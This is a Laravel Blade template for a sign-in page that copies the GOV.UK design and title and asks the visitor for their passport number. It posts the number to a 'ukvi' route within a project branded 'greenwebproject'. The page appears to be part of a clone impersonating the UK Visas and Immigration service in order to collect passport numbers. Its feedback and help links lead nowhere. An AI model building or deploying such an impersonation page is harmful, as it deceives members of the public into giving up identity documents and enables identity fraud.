@extends('layouts.greenwebproject')

@section('title', 'What is your passport number? - GOV.UK')

@section('content')
<div class="max-w-2xl px-4 sm:px-0 mx-auto">
  {{-- Beta Banner --}}
  <div class="bg-greenwebproject-light-grey border-b-4 border-greenwebproject-blue px-4 py-3 mb-8">
    <p class="m-0 text-base text-greenwebproject-black">
      <strong class="text-greenwebproject-blue font-bold">Beta</strong>
      This is a new service - your <a href="#" class="text-greenwebproject-blue underline hover:text-greenwebproject-dark-blue">feedback</a> will help us to improve it.
    </p>
  </div>

  {{-- Back Link --}}
  <a href="{{ route('ukvi.select-identity') }}" class="text-greenwebproject-blue underline hover:text-greenwebproject-dark-blue text-[16px] mb-6 inline-block">
    <svg class="inline-block w-4 h-4 mr-1 -mt-1" fill="currentColor" viewBox="0 0 12 12"><path d="M7.773 10.667 3.106 6l4.667-4.667 1.227 1.227L5.56 6l3.44 3.44z"/></svg>
    Back
  </a>

  {{-- Form Section --}}
  <p class="text-[16px] text-greenwebproject-grey mb-2">Sign in</p>

  <h1 class="text-[32px] md:text-[40px] font-bold text-greenwebproject-black mb-6 leading-[1.2]">
    What is your passport number?
  </h1>

  {{-- Form --}}
  <form method="POST" action="{{ route('ukvi.passport.post') }}" class="mb-8">
    @csrf

    {{-- Passport Number Input --}}
    <div class="mb-6">
      <label for="passport_number" class="block text-[16px] font-bold text-greenwebproject-black mb-2">
        Passport number
      </label>
      <p class="text-[16px] text-greenwebproject-grey mb-4">For example, 120382978</p>
      <input
        type="text"
        id="passport_number"
        name="passport_number"
        class="w-full border-2 border-greenwebproject-mid-grey px-4 py-3 text-[16px] focus:outline-none focus:border-greenwebproject-blue focus:ring-4 focus:ring-greenwebproject-yellow"
        required
      >
    </div>

    {{-- Continue Button --}}
    <button type="submit" class="inline-block bg-greenwebproject-green text-white font-bold text-[16px] px-6 py-3 shadow-[0_2px_0_#002d18] hover:bg-[#005a30] no-underline leading-[1.5]">
      Continue
    </button>
  </form>

  {{-- Help Link --}}
  <div class="mt-8 pt-8 border-t border-greenwebproject-mid-grey">
    <p class="text-[16px] text-greenwebproject-black mb-4">
      <a href="#" class="text-greenwebproject-blue underline hover:text-greenwebproject-dark-blue">I do not know my passport number</a>
    </p>
  </div>
</div>
@endsection
